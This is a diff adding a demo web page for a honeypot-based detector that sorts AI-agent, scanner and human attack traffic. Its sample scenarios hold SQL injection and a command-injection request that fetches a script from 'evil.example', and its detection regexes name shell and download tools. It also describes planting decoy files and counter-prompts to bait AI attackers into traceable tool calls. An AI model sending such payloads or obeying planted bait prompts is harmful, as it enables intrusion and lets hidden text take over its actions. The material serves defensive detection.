@@ -1,0 +1,1078 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>AI 流量识别 Demo</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #08111c;
+      --panel: #101c29;
+      --line: #24384c;
+      --text: #eaf4ff;
+      --muted: #8fa6b8;
+      --blue: #58c7f3;
+      --ai: #ff8b3d;
+      --human: #41d79a;
+      --uncertain: #f5c84c;
+      font-family: Inter, "PingFang SC", "Microsoft YaHei", sans-serif;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); }
+    .page { width: min(1200px, calc(100vw - 32px)); margin: 0 auto; padding: 22px 0 28px; }
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--line);
+    }
+    h1 { margin: 0; font-size: 22px; }
+    .source-note { margin-top: 6px; color: #7f94a6; font-size: 11px; }
+    .subtitle { margin-top: 4px; color: var(--muted); font-size: 12px; }
+    .layout {
+      display: grid;
+      grid-template-columns: 230px 1fr;
+      gap: 14px;
+      margin-top: 14px;
+      align-items: start;
+    }
+    .panel { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; overflow: hidden; }
+    .panel-title { padding: 12px 14px; border-bottom: 1px solid var(--line); font-size: 13px; font-weight: 600; }
+    .scenarios { display: grid; padding: 10px; gap: 8px; }
+    .scenario-select {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: #0c1723;
+      color: var(--text);
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .scenario-select:focus { border-color: var(--blue); outline: none; }
+    .header-scenario { margin-top: 14px; }
+    .scenario-wrapper { padding: 12px 14px; }
+    .scenario-meta {
+      margin: 0 14px 12px;
+      color: var(--muted);
+      font-size: 11px;
+      line-height: 1.5;
+    }
+    .main { display: grid; gap: 14px; }
+    .result { display: grid; grid-template-columns: auto 1fr; gap: 24px; align-items: center; padding: 16px 18px; }
+    .label { font-size: 28px; font-weight: 800; line-height: 1; }
+    .score { margin-top: 6px; color: var(--muted); font-size: 12px; }
+    .label.ai { color: var(--ai); }
+    .label.human { color: var(--human); }
+    .label.uncertain { color: var(--uncertain); }
+    .llm-grid { display: grid; grid-template-columns: 1fr; gap: 14px; padding: 14px; align-items: stretch; }
+    .llm-result { display: grid; grid-template-columns: 1fr; gap: 9px; }
+    .llm-meta {
+      padding: 10px;
+      border: 1px solid rgba(36, 56, 76, .7);
+      border-radius: 8px;
+      color: var(--muted);
+      font-size: 11px;
+      line-height: 1.5;
+    }
+    .llm-meta b { color: var(--text); font-size: 12px; }
+    .llm-item { padding: 9px 10px; border: 1px solid rgba(36, 56, 76, .7); border-radius: 8px; }
+    .llm-item b { color: var(--blue); }
+    .prompt-box {
+      margin-top: 14px;
+      padding: 10px;
+      border: 1px solid rgba(36, 56, 76, .7);
+      border-radius: 8px;
+      background: rgba(8, 17, 28, .75);
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 11px;
+      line-height: 1.55;
+      color: #cde7f6;
+      white-space: pre-wrap;
+      word-break: break-word;
+      max-height: 220px;
+      overflow: auto;
+    }
+    .prompt-title { margin-top: 12px; color: var(--muted); font-size: 11px; font-weight: 600; }
+    .llm-status { padding: 12px 14px; color: var(--muted); font-size: 12px; }
+    .llm-status.loading { color: var(--blue); }
+    .llm-status.error { color: #ff6b6b; }
+    .llm-toolbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 14px;
+      border-bottom: 1px solid var(--line);
+    }
+    .llm-note { color: var(--muted); font-size: 12px; }
+    .llm-button {
+      padding: 8px 14px;
+      border: 1px solid var(--blue);
+      border-radius: 8px;
+      background: rgba(88, 199, 243, .12);
+      color: var(--blue);
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .llm-button:disabled { opacity: .55; cursor: not-allowed; }
+    .aggregate { padding: 12px 14px; display: grid; gap: 9px; font-size: 12px; }
+    .aggregate-row { display: flex; gap: 8px; align-items: baseline; }
+    .aggregate-row b { min-width: 84px; color: var(--muted); font-weight: 500; }
+    .aggregate-row span { color: var(--text); }
+    .aggregate-row b.timeline-label { min-width: 116px; }
+    .calculation {
+      margin: 0 14px 12px;
+      padding: 10px;
+      border: 1px dashed rgba(36, 56, 76, .9);
+      border-radius: 8px;
+      background: rgba(8, 17, 28, .55);
+      color: #bdeeff;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 11px;
+      line-height: 1.6;
+      word-break: break-word;
+    }
+    .mini-flow {
+      margin-top: 8px;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 11px;
+      color: #bdeeff;
+    }
+    .attack-steps {
+      display: grid;
+      gap: 8px;
+      padding: 12px 14px;
+    }
+    .attack-step {
+      display: grid;
+      grid-template-columns: 22px 1fr;
+      gap: 10px;
+      align-items: start;
+    }
+    .attack-index {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 22px;
+      height: 22px;
+      border: 1px solid var(--blue);
+      border-radius: 99px;
+      color: var(--blue);
+      font-size: 11px;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+    }
+    .attack-main { font-size: 13px; }
+    .attack-detail {
+      margin-top: 3px;
+      color: var(--muted);
+      font-size: 12px;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      word-break: break-all;
+    }
+    .attack-chain-summary {
+      margin: 0 14px 12px;
+      padding: 10px;
+      border: 1px dashed rgba(88, 199, 243, .45);
+      border-radius: 8px;
+      color: #bdeeff;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 11px;
+    }
+    .command-chain {
+      margin: 0 14px 12px;
+      border: 1px dashed rgba(36, 56, 76, .9);
+      border-radius: 8px;
+      background: rgba(8, 17, 28, .55);
+      overflow: hidden;
+    }
+    .command-chain-toggle {
+      display: flex;
+      width: 100%;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 10px;
+      border: 0;
+      background: transparent;
+      color: var(--muted);
+      font-size: 11px;
+      cursor: pointer;
+      text-align: left;
+    }
+    .command-chain-toggle:hover { color: var(--blue); }
+    .command-chain-list {
+      margin: 0;
+      padding: 0 10px 10px;
+      list-style: none;
+      display: none;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 11px;
+      line-height: 1.7;
+      color: #cde7f6;
+    }
+    .command-chain.expanded .command-chain-list { display: block; }
+    .command-chain.expanded .command-chain-arrow { transform: rotate(90deg); }
+    .command-chain-arrow { display: inline-block; transition: transform .16s ease; }
+    .command-time { color: var(--muted); margin-right: 8px; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    th {
+      padding: 10px 14px;
+      text-align: left;
+      color: var(--muted);
+      font-weight: 500;
+      border-bottom: 1px solid var(--line);
+    }
+    td { padding: 9px 14px; border-bottom: 1px solid rgba(36, 56, 76, .55); }
+    tr:last-child td { border-bottom: 0; }
+    td.number, th.number { text-align: right; font-family: ui-monospace, SFMono-Regular, monospace; }
+    .attack-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .tag { padding: 2px 7px; border-radius: 99px; font-size: 11px; }
+    .tag.ai { color: var(--ai); background: rgba(255, 139, 61, .12); }
+    .tag.human { color: var(--human); background: rgba(65, 215, 154, .12); }
+    .tag.uncertain { color: var(--uncertain); background: rgba(245, 200, 76, .12); }
+    @media (max-width: 760px) {
+      .layout { grid-template-columns: 1fr; }
+      .layout > aside.panel { position: static; }
+      .result { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header>
+      <div>
+        <h1>AI 流量识别</h1>
+        <div class="source-note">本 Demo 从 /Users/xiaoluer/Desktop/ai-d-sensor-main 项目中提炼核心评分规则及判定标准；每次修改 Demo 时以该项目为准。</div>
+        <div class="subtitle">单请求识别 → 诱导确认 → 同源聚合 → LLM 研判 → 处置决策</div>
+      </div>
+    </header>
+
+    <section class="panel header-scenario">
+      <div class="panel-title">演示场景（AI / 非 AI 攻击 SSH 蜜罐对照）</div>
+      <div class="scenario-wrapper"><select class="scenario-select" id="scenarioSelect"></select></div>
+      <div class="scenario-meta" id="scenarioMeta">等待加载攻击会话...</div>
+    </section>
+
+    <div class="main">
+        <section class="panel">
+          <div class="panel-title">攻击者做了什么</div>
+          <div class="calculation" id="attackBehaviorSummary"></div>
+          <div class="attack-chain-summary" id="attackChainSummary"></div>
+          <div class="command-chain expanded" id="commandChain">
+            <button class="command-chain-toggle" id="commandChainToggle" type="button">
+              <span id="commandChainLabel">完整命令链</span>
+              <span class="command-chain-arrow">▶</span>
+            </button>
+            <ol class="command-chain-list" id="commandChainList"></ol>
+          </div>
+        </section>
+
+        <section class="panel">
+          <div class="panel-title">攻击者特征提取</div>
+          <div class="calculation">这里只提取和聚合证据，不做最终评分。静态特征识别客户端与协议；上下文特征用同源最近 120 条事件计算。</div>
+          <table>
+            <thead>
+              <tr>
+                <th>特征</th>
+                <th>提取结果</th>
+                <th>状态</th>
+              </tr>
+            </thead>
+            <tbody id="featureRows"></tbody>
+          </table>
+        </section>
+
+        <section class="panel">
+          <div class="panel-title">诱导确认（放置诱饵后观察 AI 是否执行）</div>
+          <div class="calculation">先在 SSH 蜜罐中放置诱饵文件和反向提示词，再观察攻击者是否读取诱饵并执行工具/MCP 调用。读取诱饵是部分确认，读取诱饵后执行工具是强确认。</div>
+          <div class="aggregate" id="deceptionEvidence"></div>
+        </section>
+
+        <section class="panel">
+          <div class="panel-title">同源 IP 聚合</div>
+          <div class="aggregate" id="aggregate"></div>
+        </section>
+
+        <section class="panel">
+          <div class="panel-title">AI 溯源反制（业务拟态 + 反向提示词）</div>
+          <div class="calculation">仅当 LLM 高置信度判定 AI 后可启用。拟态内容提供可继续探索的业务路径，反向提示词引导受控工具回调，用于溯源补强。</div>
+          <div class="aggregate" id="countermeasureEvidence"></div>
+        </section>
+
+        <section class="panel">
+          <div class="panel-title">LLM 攻击流研判</div>
+          <div style="padding: 14px;">
+            <div class="llm-meta">
+              模型 <b>deepseek-flash</b><br>
+              输入：特征状态 + 会话命令链 + 诱导确认 + 同源聚合 + 时间线
+            </div>
+            <div class="prompt-title">System Prompt</div>
+            <div class="prompt-box" id="systemPrompt">切换场景后自动生成</div>
+            <div class="prompt-title">User Prompt</div>
+            <div class="prompt-box" id="userPrompt">切换场景后自动生成</div>
+            <div class="prompt-title">User Prompt 字段说明（仅用于理解，不投喂给 LLM）</div>
+            <div class="prompt-box" id="userPromptExplain">切换场景后自动生成</div>
+          </div>
+          <div class="llm-toolbar">
+            <div class="llm-note" id="llmStatus">等待研判</div>
+            <div style="display: flex; gap: 8px;">
+              <button class="llm-button" id="runLlm" type="button">执行 LLM 研判</button>
+              <button class="llm-button" id="enableCountermeasure" type="button" disabled>启用 AI 反制</button>
+            </div>
+          </div>
+          <div class="llm-grid">
+            <div class="llm-result" id="llmResult"></div>
+          </div>
+        </section>
+
+        <section class="panel result">
+          <div>
+            <div class="label" id="verdict">--</div>
+            <div class="score" id="confidence">--</div>
+          </div>
+        </section>
+
+      </div>
+    </section>
+  </main>
+  <script>
+    const builtinScenarios = {
+      aiOrchestrated: {
+        label: "AI Agent 编排攻击",
+        sourceIp: "10.244.0.17",
+        requests: [
+          { timestamp: "10:00:00", method: "GET", uri: "/", ua: "codex/1.0", alpn: "h2", delay: 0 },
+          { timestamp: "10:00:01", method: "GET", uri: "/robots.txt", ua: "codex/1.0", alpn: "h2", delay: 1 },
+          { timestamp: "10:00:02", method: "GET", uri: "/api/users", ua: "codex/1.0", alpn: "h2", delay: 1 },
+          { timestamp: "10:00:03", method: "GET", uri: "/admin", ua: "codex/1.0", alpn: "h2", delay: 1 },
+          { timestamp: "10:00:04", method: "GET", uri: "/.env", ua: "codex/1.0", alpn: "h2", delay: 1 },
+          { timestamp: "10:00:05", method: "POST", uri: "/api/login", ua: "codex/1.0", alpn: "h2", body: "username=admin' or 1=1--&password=x", delay: 1 },
+          { timestamp: "10:00:06", method: "GET", uri: "/api/debug?cmd=id;curl+http://evil.example/x.sh", ua: "codex/1.0", alpn: "h2", delay: 1 }
+        ]
+      },
+      aiDirect: {
+        label: "AI 工具直扫",
+        sourceIp: "10.244.0.18",
+        requests: [
+          { timestamp: "10:01:00", method: "GET", uri: "/", ua: "python-requests/2.31", alpn: "http/1.1", delay: 0 },
+          { timestamp: "10:01:01", method: "GET", uri: "/.git/config", ua: "python-requests/2.31", alpn: "http/1.1", delay: 1 },
+          { timestamp: "10:01:02", method: "GET", uri: "/backup.zip", ua: "python-requests/2.31", alpn: "http/1.1", delay: 1 },
+          { timestamp: "10:01:03", method: "GET", uri: "/api/health", ua: "python-requests/2.31", alpn: "http/1.1", delay: 1 },
+          { timestamp: "10:01:04", method: "GET", uri: "/admin/login", ua: "python-requests/2.31", alpn: "http/1.1", delay: 1 }
+        ]
+      },
+      automatedScan: {
+        label: "传统自动化扫描",
+        sourceIp: "10.244.0.19",
+        requests: [
+          { timestamp: "10:02:00", method: "GET", uri: "/", ua: "sqlmap/1.8", alpn: "http/1.1", delay: 0 },
+          { timestamp: "10:02:00", method: "GET", uri: "/?id=1%20or%201=1", ua: "sqlmap/1.8", alpn: "http/1.1", delay: 0 },
+          { timestamp: "10:02:00", method: "GET", uri: "/?id=1%20and%20sleep(3)", ua: "sqlmap/1.8", alpn: "http/1.1", delay: 0 },
+          { timestamp: "10:02:00", method: "GET", uri: "/wp-login.php", ua: "sqlmap/1.8", alpn: "http/1.1", delay: 0 }
+        ]
+      },
+      humanBrowser: {
+        label: "真人浏览器访问",
+        sourceIp: "10.244.0.31",
+        requests: [
+          { timestamp: "10:03:00", method: "GET", uri: "/", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126 Safari/537.36", alpn: "h2", delay: 0 },
+          { timestamp: "10:03:08", method: "GET", uri: "/products", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126 Safari/537.36", alpn: "h2", delay: 8 },
+          { timestamp: "10:03:23", method: "GET", uri: "/products/detail?id=128", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126 Safari/537.36", alpn: "h2", delay: 15 },
+          { timestamp: "10:04:02", method: "POST", uri: "/cart", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126 Safari/537.36", alpn: "h2", body: "productId=128&quantity=1", delay: 39 },
+          { timestamp: "10:04:31", method: "POST", uri: "/login", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126 Safari/537.36", alpn: "h2", body: "username=demo&password=123456", delay: 29 }
+        ]
+      },
+      distributed: {
+        label: "分布式扫描组",
+        sourceIp: "10.244.2.0/24 组",
+        requests: [
+          { timestamp: "10:04:00", method: "GET", uri: "/api/users", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.11", delay: 0 },
+          { timestamp: "10:04:01", method: "GET", uri: "/api/orders", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.12", delay: 1 },
+          { timestamp: "10:04:02", method: "GET", uri: "/api/admin", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.13", delay: 1 },
+          { timestamp: "10:04:04", method: "GET", uri: "/.env", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.11", delay: 2 },
+          { timestamp: "10:04:05", method: "GET", uri: "/.git/config", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.12", delay: 1 },
+          { timestamp: "10:04:06", method: "GET", uri: "/actuator/env", ua: "python-requests/2.31", alpn: "http/1.1", ip: "10.244.2.13", delay: 1 }
+        ]
+      }
+    };
+    let scenarios = { ...builtinScenarios };
+
+    const average = values => values.reduce((sum, value) => sum + value, 0) / values.length;
+    const std = values => Math.sqrt(average(values.map(value => (value - average(values)) ** 2)));
+    const clamp = value => Math.max(0, Math.min(1, value));
+    const text = (id, value) => document.getElementById(id).textContent = value;
+
+    const uaPatterns = [
+      { pattern: /python-requests\/[\d.]+/i, label: "Python requests" },
+      { pattern: /python-urllib\/[\d.]+/i, label: "Python urllib" },
+      { pattern: /^curl\/[\d.]+/i, label: "curl" },
+      { pattern: /^wget\/[\d.]+/i, label: "wget" },
+      { pattern: /^Go-http-client\/[\d.]+/i, label: "Go http client" },
+      { pattern: /node-fetch\/[\d.]+/i, label: "Node fetch" },
+      { pattern: /^axios\/[\d.]+/i, label: "Node axios" },
+      { pattern: /claude-cli\/[\d.]+/i, label: "Claude Code CLI" },
+      { pattern: /^codex\/[\d.]+/i, label: "OpenAI Codex" },
+      { pattern: /claude\/[\d.]+/i, label: "Claude SDK" },
+      { pattern: /openai\/[\d.]+/i, label: "OpenAI SDK" },
+      { pattern: /python-aiohttp\/[\d.]+/i, label: "Python aiohttp" },
+      { pattern: /reqwest\/[\d.]+/i, label: "Rust reqwest" },
+      { pattern: /^okhttp\/[\d.]+/i, label: "Java okhttp" },
+      { pattern: /^Java\/[\d.]+/i, label: "Java HttpClient" },
+      { pattern: /^libwww-perl\/[\d.]+/i, label: "Perl LWP" },
+      { pattern: /^Mozilla\/.*Chrome/i, label: "Chrome browser" },
+      { pattern: /^Mozilla\/.*Firefox/i, label: "Firefox browser" },
+      { pattern: /^Mozilla\/.*Safari/i, label: "Safari browser" },
+      { pattern: /^Mozilla\/.*Edge/i, label: "Edge browser" },
+      { pattern: /^Mozilla\/5\.0.*AppleWebKit/i, label: "Generic WebKit" },
+      { pattern: /^Mozilla/i, label: "Generic Mozilla" }
+    ];
+
+    function scoreUa(value) {
+      const ua = value || "";
+      for (const item of uaPatterns) {
+        if (item.pattern.test(ua)) return { status: "MATCHED", signal: item.label, matchedPattern: String(item.pattern) };
+      }
+      return { status: "UNKNOWN", signal: "无匹配特征", matchedPattern: "无" };
+    }
+
+    function scoreAlpn(value) {
+      if (!value || ["unknown", "none"].includes(value.toLowerCase())) return { status: "UNKNOWN", signal: "无数据" };
+      return { status: "MATCHED", signal: value };
+    }
+
+    function scoreTiming(delays) {
+      if (delays.length < 3) return { status: "SAMPLE_INSUFFICIENT", signal: "同源 10 分钟内有效间隔不足 3 条", mean: null, cv: null };
+      const mean = average(delays);
+      const cv = mean > 0 ? std(delays) / mean : 1;
+      const signal = `平均 ${mean.toFixed(2)}s · CV ${cv.toFixed(2)}`;
+      const status = mean < 2 && cv < .5 ? "HIGH_FREQUENCY" : mean > 5 ? "HUMAN_LIKE" : "MIXED";
+      return { status, signal, mean, cv };
+    }
+
+    function scoreTool(requests) {
+      const texts = requests.map(({ ua }) => ua).filter(Boolean);
+      const toolPatterns = [
+        { key: "nmap", pattern: /nmap|masscan|zgrab|zmap/i, label: "nmap" },
+        { key: "nuclei", pattern: /nuclei|xray|afrog|poc-bomber|pocscan/i, label: "nuclei" },
+        { key: "sqlmap", pattern: /sqlmap/i, label: "sqlmap" },
+        { key: "dir_enum", pattern: /dirsearch|gobuster|ffuf|feroxbuster|nikto|whatweb/i, label: "dir_enum" },
+        { key: "bruteforce", pattern: /hydra|medusa|patator|ncrack/i, label: "bruteforce" },
+        { key: "http_client", pattern: /curl|wget|python-requests|aiohttp|urllib|go-http-client|okhttp|axios|node-fetch|reqwest/i, label: "http_client" },
+        { key: "ai_agent", pattern: /claude|codex|openai|anthropic|langchain|autogen|crewai|llm|agent|mcp|minimax/i, label: "ai_agent" }
+      ];
+      const found = toolPatterns.filter(({ pattern }) => texts.some(text => pattern.test(text)));
+      const keys = new Set(found.map(({ key }) => key));
+      const distinctUas = new Set(texts.map(text => text.trim()));
+      const signals = [];
+      if (found.length) signals.push(`工具痕迹：${found.map(({ label }) => label).join("、")}`);
+      if (distinctUas.size >= 3) signals.push(`短窗口多 UA：${distinctUas.size}`);
+      if (keys.has("ai_agent")) signals.push("出现 AI agent/SDK/MCP 相关标识");
+      const offensiveTools = ["nmap", "nuclei", "sqlmap", "dir_enum", "bruteforce"].filter(key => keys.has(key));
+      if (offensiveTools.length >= 2 && keys.has("http_client")) signals.push("攻击工具与通用 HTTP 客户端组合");
+      const status = keys.has("ai_agent") ? "AI_AGENT_MATCHED" : offensiveTools.length ? "OFFENSIVE_TOOL_MATCHED" : found.length ? "CLIENT_MATCHED" : "NONE";
+      return { status, signals };
+    }
+
+    function scoreAttack(requests) {
+      const phasePatterns = [
+        { key: "指纹探测", pattern: /(?:\/(?:$|favicon\.ico|robots\.txt|server-status|version|health|metrics))|whatweb|nmap|zgrab/i },
+        { key: "接口发现", pattern: /swagger|openapi|api-docs|graphql|graphiql|v2\/api|v3\/api|actuator/i },
+        { key: "目录枚举", pattern: /\.env|\.git|backup|bak|config|admin|console|manager|upload|download|debug/i },
+        { key: "凭证尝试", pattern: /login|signin|auth|token|oauth|password|passwd|wp-login|j_?security_check/i },
+        { key: "漏洞验证", pattern: /(?:union\s+select|information_schema|sleep\(|benchmark\(|\bor\b.+\b1=1\b|\.\.\/|etc\/passwd|cmd=|exec=|whoami|\bid\b|bash|powershell|<script|onerror=)/i }
+      ];
+      const phaseHits = new Map();
+      requests.forEach(({ method, uri, body = "", ua }) => {
+        const value = `${method} ${uri} ${body} ${ua}`.trim();
+        phasePatterns.forEach(({ key, pattern }) => {
+          if (pattern.test(value)) phaseHits.set(key, (phaseHits.get(key) || 0) + 1);
+        });
+      });
+      const stages = [...phaseHits.keys()];
+      const status = stages.length ? "MATCHED" : "NONE";
+      return { status, chain: [...stages] };
+    }
+
+    function scorePayload(requests) {
+      const payloadPatterns = [
+        { key: "接口结构探测", pattern: /__schema|introspection|swagger|openapi|api-docs|graphql/i },
+        { key: "SQL 延时验证", pattern: /sleep\s*\(|benchmark\s*\(|waitfor\s+delay|pg_sleep/i },
+        { key: "SQL 数据库枚举", pattern: /union\s+select|information_schema|database\s*\(|current_user/i },
+        { key: "命令执行验证", pattern: /(?:^|[?&;\/=\s])(whoami|id|uname|curl|wget|bash|sh|powershell|cmd\.exe)(?:$|[;&|\s])/i },
+        { key: "路径穿越验证", pattern: /\.\.\/|\.\.\\|\/etc\/passwd|boot\.ini|win\.ini/i },
+        { key: "递归数据枚举", pattern: /(page|offset|limit|cursor|search|query|filter|sort|export|report|list|detail|ids?=)/i }
+      ];
+      const payloadHits = new Map();
+      requests.forEach(({ method, uri, body = "", ua }) => {
+        const value = `${method} ${uri} ${body} ${ua}`.trim();
+        payloadPatterns.forEach(({ key, pattern }) => {
+          if (pattern.test(value)) payloadHits.set(key, (payloadHits.get(key) || 0) + 1);
+        });
+      });
+      const payloads = [...payloadHits.keys()];
+      const status = payloads.length ? "MATCHED" : "NONE";
+      return { status, signals: [...payloads] };
+    }
+
+    function detect(requests, client) {
+      const delays = requests.slice(1).map((request, index) =>
+        (parseClock(request.timestamp) || 0) - (parseClock(requests[index].timestamp) || 0)
+      );
+      const ua = scoreUa(requests[0]?.ua || "");
+      const alpn = scoreAlpn(requests[0]?.alpn || "");
+      const timing = scoreTiming(delays);
+      const tool = scoreTool(requests);
+      const attack = scoreAttack(requests);
+      const payload = scorePayload(requests);
+      return {
+        ua, alpn, timing, tool, attack, payload, client,
+        breadth: Math.min(1, new Set(requests.map(({ uri }) => uri.split("?")[0])).size / Math.max(4, requests.length)),
+        delays,
+        toolSignals: tool.signals,
+        attackSignals: [...scoreAttack(requests).chain],
+        payloadSignals: [...scorePayload(requests).signals],
+        features: [
+          { name: "UA", value: ua.signal, status: ua.status, detail: ua.matchedPattern },
+          { name: "TLS ALPN", value: alpn.signal, status: alpn.status, detail: "ALPN 协商协议" },
+          { name: "请求时序", value: timing.signal, status: timing.status, detail: timing.mean === null ? "有效间隔不足" : `间隔 ${delays.join("、")} 秒` },
+          { name: "工具链", value: tool.signals.join("；") || "无", status: tool.status, detail: "同源最近 120 条上下文" },
+          { name: "攻击链", value: attack.chain.join("、") || "无", status: attack.status, detail: `${attack.chain.length} 个阶段` },
+          { name: "Payload", value: payload.signals.join("、") || "无", status: payload.status, detail: `${payload.signals.length} 类命中` }
+        ]
+      };
+    }
+
+    function escapeHtml(value) {
+      return String(value ?? "").replace(/[&<>"']/g, char => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[char]);
+    }
+
+    function parseClock(value) {
+      if (!value) return null;
+      const parts = value.split(":").map(Number);
+      if (parts.length !== 3 || parts.some(Number.isNaN)) return null;
+      return parts[0] * 3600 + parts[1] * 60 + parts[2];
+    }
+
+    const featureStatusLabels = {
+      MATCHED: "命中",
+      UNKNOWN: "无数据",
+      SAMPLE_INSUFFICIENT: "样本不足",
+      AI_AGENT_MATCHED: "命中 AI Agent",
+      OFFENSIVE_TOOL_MATCHED: "命中攻击工具",
+      CLIENT_MATCHED: "命中客户端",
+      HIGH_FREQUENCY: "高频",
+      HUMAN_LIKE: "类人节奏",
+      MIXED: "节奏混合",
+      NONE: "未命中"
+    };
+
+    function renderFeatures(feature) {
+      document.getElementById("featureRows").innerHTML = feature.features.map(({ name, value, status, detail }) => `
+        <tr>
+          <td>${name}</td>
+          <td>${escapeHtml(detail ? `${value}（${detail}）` : value)}</td>
+          <td>${escapeHtml(featureStatusLabels[status] || status)}</td>
+        </tr>
+      `).join("");
+    }
+
+    function inferAttackAction(request) {
+      const value = `${request.method} ${request.uri} ${request.body || ""}`.toLowerCase();
+      if (request.method === "SSH" && request.actionType === "password_login") return "SSH 密码登录";
+      if (request.method === "SSH" && request.uri === "执行命令") {
+        if (/tool_call|mcp|function_call/.test(value)) return "触发 AI 工具调用";
+        if (/credential|password|token|secret|shadow|id_rsa|\.pem/.test(value)) return "读取诱饵凭据";
+        if (/whoami|uname|hostname|pwd/.test(value)) return "主机信息探测";
+        if (/find|ls -l|tree|cat README|df -h/.test(value)) return "文件与目录侦察";
+        return "执行 Shell 命令";
+      }
+      if (/union|select|sleep\(|benchmark\(|<script|onerror|\$\{|jndi:|\.\.\/|;ls|;cat/.test(value)) return "投递攻击 Payload";
+      if (/\.env|\.git|backup|id_rsa|etc\/passwd/.test(value)) return "探测敏感文件";
+      if (/actuator|debug|api\/(users|orders|admin)|console/.test(value)) return "枚举接口和管理面";
+      if (/login|signin|auth/.test(value) && /union|select|or\s+1=1/.test(value)) return "尝试登录并注入凭证";
+      if (/login|signin|auth/.test(value)) return "进入登录入口";
+      if (/robots\.txt/.test(value)) return "读取爬虫约束";
+      if (/cart|order|product/.test(value)) return "正常浏览和操作业务";
+      if (request.method === "GET" && /^\/$/.test(request.uri)) return "访问首页";
+      return "访问业务路径";
+    }
+
+    function buildAttackStages(requests) {
+      const stages = [];
+      requests.forEach(request => {
+        const action = inferAttackAction(request);
+        const last = stages[stages.length - 1];
+        if (last?.action === action) {
+          last.count += 1;
+          last.commands.push(request.body || request.uri || action);
+        } else {
+          stages.push({ action, count: 1, commands: [request.body || request.uri || action] });
+        }
+      });
+      return stages;
+    }
+
+    function renderAttackSteps(requests, feature) {
+      const stages = buildAttackStages(requests);
+      document.getElementById("attackBehaviorSummary").textContent =
+        `攻击者依次完成 ${requests.length} 个会话动作；规则层只提取证据，最终评分和判定由 LLM 完成。`;
+      document.getElementById("attackChainSummary").textContent =
+        `会话动作链：${stages.map(({ action }) => action).join(" → ")}`;
+      const commandList = document.getElementById("commandChainList");
+      commandList.innerHTML = requests.map((request, index) => {
+        let detail = request.body || "";
+        if (request.actionType === "password_login") detail = "SSH 密码登录（凭据已脱敏）";
+        const action = inferAttackAction(request);
+        return `<li><span class="command-time">${escapeHtml(request.timestamp || "--")}</span>${escapeHtml(`${action} · ${detail || action}`)}</li>`;
+      }).join("");
+      const commandCount = requests.filter(({ actionType }) => actionType === "shell_command").length;
+      document.getElementById("commandChainLabel").textContent =
+        `完整时间线（${requests.length} 个动作 · ${commandCount} 条命令，凭据已脱敏）`;
+    }
+
+    function renderScenarioMeta(scenario) {
+      const latest = scenario.latestTimestamp ? new Date(scenario.latestTimestamp) : null;
+      const value = latest && !Number.isNaN(latest.getTime())
+        ? latest.toLocaleString("zh-CN", { hour12: false })
+        : "暂无";
+      const profile = scenario.profileId
+        ? ` · 模板：${scenario.profileId}${scenario.profileTask ? ` · ${scenario.profileTask}` : ""}`
+        : " · 模板：未标记";
+      document.getElementById("scenarioMeta").textContent =
+        `最新攻击时间：${value}${profile} · 来源：SSH 蜜罐实时会话`;
+    }
+
+    function renderResult(llmResponse = null) {
+      const labels = { ai: "AI", human: "HUMAN", uncertain: "UNCERTAIN" };
+      if (!llmResponse) {
+        text("verdict", "待研判");
+        document.getElementById("verdict").className = "label uncertain";
+        text("confidence", "等待 LLM 研判");
+        return;
+      }
+      const label = llmResponse.verdict;
+      text("verdict", labels[label] || "UNCERTAIN");
+      document.getElementById("verdict").className = `label ${label || "uncertain"}`;
+      text("confidence", `LLM 置信度 ${Number(llmResponse.confidence || 0).toFixed(2)}`);
+    }
+
+    function aggregate(requests, feature, client) {
+      return {
+        tools: feature.tool.signals,
+        commands: requests.map(request => `${request.timestamp} ${request.method} ${request.uri}${request.body ? ` ${request.body}` : ""}`),
+        timing: feature.timing,
+        paths: requests.map(request => `${request.timestamp} ${request.method} ${request.uri}`),
+        payloadSignals: feature.payload.signals,
+        attackChain: feature.attack.chain,
+        sourceIps: [...new Set(requests.map(({ ip }) => ip).filter(Boolean))],
+        client
+      };
+    }
+
+    function buildDeceptionEvidence(requests) {
